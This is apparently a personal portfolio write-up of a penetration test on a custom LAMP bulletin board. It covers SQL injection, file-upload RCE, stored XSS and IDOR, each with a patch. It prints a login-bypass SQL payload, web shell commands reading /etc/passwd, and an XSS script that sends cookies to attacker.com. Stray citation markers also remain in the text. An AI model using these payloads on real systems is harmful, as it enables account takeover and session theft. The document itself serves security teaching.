---
layout: single
title: "Security Assessment & Hardening of LAMP Web Server"
excerpt: "A comprehensive penetration test on a custom LAMP bulletin board, identifying and patching 11 critical vulnerabilities including RCE, SQL Injection, and XSS."
categories:
  - Security
  - Penetration Testing
tags:
  - Web Hacking
  - SQL Injection
  - RCE
  - XSS
  - Patching
header:
  teaser: /assets/images/security_audit_thumbnail.jpg # 썸네일 이미지 경로
sidebar:
  - title: "Role"
    image: /assets/images/profile.png
    image_alt: "profile"
    text: "Security Researcher & Pentester"
  - title: "Vulnerabilities Found"
    text: "RCE, SQL Injection, XSS, IDOR, Info Leak"
  - title: "Report"
    text: "View the full vulnerability report and patched code.<br><br>[View on GitHub](https://github.com/JihunB/YOUR_REPO_NAME){: .btn .btn--primary .btn--large}"
---

![OWASP](https://img.shields.io/badge/Standard-OWASP%20Top%2010-black?logo=owasp&logoColor=white)
![Burp Suite](https://img.shields.io/badge/Tool-Burp%20Suite-FF6633?logo=burpsuite&logoColor=white)
![Patching](https://img.shields.io/badge/Task-Secure%20Coding-green)

## 📌 Project Overview
[cite_start]Following the deployment of the LAMP web server, I conducted a **black-box and gray-box penetration test** to assess its security posture[cite: 79]. The assessment revealed **11 distinct vulnerabilities**, ranging from information leakage to critical Remote Code Execution (RCE).

[cite_start]This project documents the exploitation process (PoC) for each vulnerability and the subsequent **security patches** applied to harden the system[cite: 80].

---

## 🚨 Key Vulnerabilities & Exploitation

### 1. Authentication Bypass (SQL Injection)
**Severity:** <span style="color:red">**High**</span>

[cite_start]The login logic directly concatenated user input into the SQL query without sanitization, allowing attackers to bypass authentication using standard SQL injection payloads[cite: 221].

**Vulnerable Code:**
```php
$sql = "SELECT * FROM users WHERE username LIKE '%" . $username . "%'";
```
**Exploitation (PoC):** 
By entering ' OR '1'='1' -- into the username field, the query becomes always true, logging the attacker in as the first user (Administrator) without a password.

**Patch (Secure Coding):** 
Implemented Prepared Statements to separate data from the query structure.

```php
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
```
### 2. Remote Code Execution (RCE) via File Upload
**Severity:** <span style="color:red">Critical</span>

The file upload function only validated file extensions on the client side or used a weak blacklist on the server side (disallowedExtensions), which was easily bypassed by changing extensions (e.g., .php to .PHP or .php5).

**Exploitation (PoC):**

Uploaded a malicious PHP web shell (test.php) by renaming it or manipulating the request.

Accessed the uploaded file path exposed by Directory Listing vulnerability.

Executed system commands via the web shell: ?cmd=ls or ?cmd=cat /etc/passwd.

**Patch (Secure Coding):** 
Enforced a whitelist of allowed extensions (jpg, png) and validated the MIME Type of the uploaded files. Additionally, disabled script execution in the upload directory using .htaccess.


### 3. Stored Cross-Site Scripting (XSS)
**Severity:** <span style="color:orange">High</span>

User input in the "Post Title" and "Content" fields was stored in the database without filtering and displayed back to users without escaping.


**Exploitation (PoC):** 
Injected a malicious script into a post:

![설명](/assets/images/xss.png)
```html
<script>location.href="[http://attacker.com/cookie?c=](http://attacker.com/cookie?c=)"+document.cookie</script>
```
When a victim views the post, their Session ID is stolen and sent to the attacker's server.


**Patch (Secure Coding):** 
Applied htmlspecialchars() to convert special characters into HTML entities before outputting data.

```php
echo "<h3>" . htmlspecialchars($row['title']) . "</h3>";
```

### 4. Insecure Direct Object Reference (IDOR)
**Severity:** <span style="color:orange">Medium</span>

The "Edit Post" functionality took the post_id directly from the URL parameter (edit_post.php?id=37) without verifying if the current user owned that post.

**Exploitation (PoC):** 
Simply changing the ID in the URL from 37 to 36 allowed an attacker to modify or delete posts belonging to other users.

**Patch (Secure Coding):** 
Added a check to verify that the user_id of the post matches the currently logged-in $_SESSION['user_id'].

### 🔍 Other Vulnerabilities Identify
In addition to the critical issues above, the following vulnerabilities were also remediated:


**Database Leak:** Hardcoded database credentials in PHP files were moved to environment variables (.env).



**Directory Listing:** Disabled Options Indexes in Apache configuration to prevent listing of uploaded files and .git directories.



**Session Security:** Fixed Session Fixation and Session Timeout  issues by regenerating session IDs and implementing timeouts.



**Rate Limiting:** Implemented login attempt limits to prevent Brute-Force attacks.


### 🎯 Conclusion
This assessment demonstrated that even a functional application can harbor critical security flaws if not built with a Secure SDLC mindset. By identifying 11 vulnerabilities and applying defensive code, I gained practical experience in both Offensive Security (Red Teaming) and Defensive Programming (Blue Teaming).
